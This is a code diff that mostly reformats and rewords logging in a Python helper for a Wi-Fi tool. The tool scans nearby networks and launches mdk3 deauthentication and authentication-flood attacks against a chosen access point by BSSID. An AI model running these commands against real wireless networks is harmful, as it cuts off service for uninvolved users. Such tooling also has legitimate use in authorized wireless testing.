@@ -23,11 +23,7 @@ from logger import logger
 devnull = open(os.devnull, "wt")
 
 
-def sleep(
-    seconds: float,
-    /,
-    simple: bool = False,
-):
+def sleep(seconds: float, /, simple: bool = False):
     cols = [
         SpinnerColumn(),
         BarColumn(),
@@ -35,12 +31,8 @@ def sleep(
         TimeElapsedColumn(),
     ]
 
-    with Progress(
-        *(cols if not simple else cols[:1]),
-        transient=False,
-    ) as progress:
+    with Progress(*(cols if not simple else cols[:1]), transient=False) as progress:
         task = progress.add_task("[green]Processing", total=seconds)
-
         while not progress.finished:
             progress.update(task, advance=0.2)
             time.sleep(0.2)
@@ -51,22 +43,17 @@ def check_interface(timeout: int = 5):
         @wraps(func)
         def wrapper(interface: str, *args, **kwargs) -> Any:
             p = subprocess.run(
-                [
-                    "sudo",
-                    "ip",
-                    "link",
-                    "show",
-                    "dev",
-                    interface,
-                ],
+                ["sudo", "ip", "link", "show", "dev", interface],
                 capture_output=True,
                 text=True,
             )
 
             if p.returncode:
-                logger.error(p.stderr)
+                logger.error(
+                    f"Interface '{interface}' is unavailable. Retrying in {timeout}s..."
+                )
+                logger.debug(f"{p.stderr.strip()}")
                 sleep(timeout, simple=True)
-
                 return wrapper(interface, *args, **kwargs)
 
             return func(interface, *args, **kwargs)
@@ -77,7 +64,7 @@ def check_interface(timeout: int = 5):
 
 
 def kill(name: str):
-    logger.info("Killing previous mdk3 processes...")
+    logger.info(f"Terminating any running '{name}' processes...")
     subprocess.run(
         ["sudo", "pkill", "-9", name],
         capture_output=True,
@@ -99,67 +86,41 @@ def mdk3(
     change_interface_type(interface, "monitor")
     change_interface_channel(interface, channel)
 
-    logger.info("Starting the <b>mdk3</b> sub processe(s)...")
+    logger.info(
+        f"Launching mdk3 attack processes (interface={interface}, channel={channel})"
+    )
 
     if mode > 0:
         cmd = ["sudo", "mdk3", interface, "d"]
-
         if whitelist:
             cmd.extend(["-w", whitelist.name])
-
         if blacklist:
             cmd.extend(["-b", blacklist.name])
 
         threading.Thread(
             target=subprocess.run,
             args=(cmd,),
-            kwargs={
-                "capture_output": True,
-                "text": True,
-                "check": False,
-            },
+            kwargs={"capture_output": True, "text": True, "check": False},
         ).start()
 
     if mode > 1:
         threading.Thread(
             target=subprocess.run,
-            args=(
-                [
-                    "sudo",
-                    "mdk3",
-                    interface,
-                    "a",
-                    "-a",
-                    bssid,
-                    "-c",
-                    "-m",
-                ],
-            ),
-            kwargs={
-                "capture_output": True,
-                "text": True,
-                "check": False,
-            },
+            args=(["sudo", "mdk3", interface, "a", "-a", bssid, "-c", "-m"],),
+            kwargs={"capture_output": True, "text": True, "check": False},
         ).start()
 
 
 @check_interface()
 def change_interface_status(interface: str, status: Literal["up", "down"]):
+    stdout = subprocess.run(
+        ["sudo", "ip", "link", "show", "dev", interface],
+        capture_output=True,
+        text=True,
+    ).stdout
+
     if (
-        (
-            stdout := subprocess.run(
-                [
-                    "sudo",
-                    "ip",
-                    "link",
-                    "show",
-                    "dev",
-                    interface,
-                ],
-                capture_output=True,
-                text=True,
-            ).stdout
-        )
+        stdout
         and status == "up"
         and status.upper() in stdout
         or status == "down"
@@ -167,11 +128,10 @@ def change_interface_status(interface: str, status: Literal["up", "down"]):
     ):
         return 0
 
-    logger.debug(f"Make the interface {interface!r} {status}.")
+    logger.debug(f"Setting interface '{interface}' state to {status.upper()}")
     p = subprocess.run(
-        ["sudo", "ip", "link", "set", interface, f"{status}"],
+        ["sudo", "ip", "link", "set", interface, status],
     )
-
     return p.returncode
 
 
@@ -180,13 +140,7 @@ def change_interface_type(interface: str, _type: Literal["managed", "monitor"]):
     if (
         _type
         in subprocess.run(
-            [
-                "sudo",
-                "iw",
-                "dev",
-                interface,
-                "info",
-            ],
+            ["sudo", "iw", "dev", interface, "info"],
             capture_output=True,
             text=True,
         ).stdout
@@ -195,13 +149,12 @@ def change_interface_type(interface: str, _type: Literal["managed", "monitor"]):
 
     change_interface_status(interface, "down")
 
-    logger.debug(f"Change the interface {interface!r} type to {_type}.")
+    logger.debug(f"Switching interface '{interface}' to {_type} mode")
     p = subprocess.run(
-        ["sudo", "iw", "dev", interface, "set", "type", f"{_type}"],
+        ["sudo", "iw", "dev", interface, "set", "type", _type],
     )
 
     change_interface_status(interface, "up")
-
     return p.returncode
 
 
@@ -210,21 +163,10 @@ def change_interface_channel(interface: str, channel: int):
     change_interface_type(interface, "monitor")
     change_interface_status(interface, "up")
 
-    logger.debug(
-        f"Trying to change the interface {interface!r} channel to {channel}..."
-    )
+    logger.debug(f"Setting interface '{interface}' to channel {channel}")
     p = subprocess.run(
-        [
-            "sudo",
-            "iw",
-            "dev",
-            f"{interface}",
-            "set",
-            "channel",
-            f"{channel}",
-        ],
+        ["sudo", "iw", "dev", interface, "set", "channel", str(channel)],
     )
-
     return p.returncode
 
 
@@ -233,7 +175,7 @@ def get_networks(interface: str):
     change_interface_type(interface, "managed")
     change_interface_status(interface, "up")
 
-    logger.debug("Scanning for around wireless networks...")
+    logger.debug("Scanning for nearby wireless networks...")
     process = subprocess.run(
         ["egrep", "^BSS|SSID:|signal:|channel:|set: channel"],
         capture_output=True,
@@ -248,7 +190,6 @@ def get_networks(interface: str):
     )
 
     lst = []
-
     for a in [
         "\n".join([y.strip() for y in x.strip().split("\n")])
         for x in process.stdout.split("BSS")
@@ -263,7 +204,7 @@ def get_networks(interface: str):
         if search := re.search("channel:?.[0-9]{1,}", a):
             start, end = search.span()
             vals.append(
-                int(x) if (x := re.sub("channel:?.", "", a[start:end])) else None,
+                int(x) if (x := re.sub("channel:?.", "", a[start:end])) else None
             )
 
         if search := re.search("SSID:.*", a):
@@ -282,19 +223,15 @@ def get_networks(interface: str):
         lst.append(item)
 
     dct = dict(lst)
-
-    if not len(dct):
-        logger.debug("No access point was found!!!")
-
+    if not dct:
+        logger.warning("No wireless access points detected during scan.")
     return dct
 
 
 def print_table(console, dct):
     try:
         table: Table = Table()
-
         cols: List[str] = ["No", "BSSID", "SSID", "CH", "SIGNAL"]
-
         for col in cols:
             table.add_column(col)
 
@@ -302,29 +239,21 @@ def print_table(console, dct):
         table.border_style = "white"
 
         for index, (bssid, vals) in enumerate(
-            sorted(
-                dct.items(),
-                key=lambda item: item.__getitem__(-1).__getitem__(-1),
-            )
+            sorted(dct.items(), key=lambda item: item[-1][-1])
         ):
             channel, ssid, signal = vals
-
             table.add_row(
-                *map(
-                    str,
-                    [
-                        f"{index + 1}",
-                        f"[bold]{bssid.upper()}[/]",
-                        ssid,
-                        f"[bold cyan]{channel}[/]",
-                        f"[bold italic]{signal}[/]",
-                    ],
-                )
+                str(index + 1),
+                f"[bold]{bssid.upper()}[/]",
+                ssid,
+                f"[bold cyan]{channel}[/]",
+                f"[bold italic]{signal}[/]",
             )
 
         console.print(table)
     except Exception as err:
-        console.print(err)
+        logger.exception(f"Failed to render network table: {err}")
+        console.print("[red]Error displaying network table[/red]")
 
 
 def notify(payload):
@@ -332,10 +261,7 @@ def notify(payload):
         topic=Config.TOPIC,
         payload=payload,
         hostname=Config.BROKER_IP,
-        auth={
-            "username": Config.USERNAME,
-            "password": Config.PASSWORD,
-        },
+        auth={"username": Config.USERNAME, "password": Config.PASSWORD},
     )
 
 
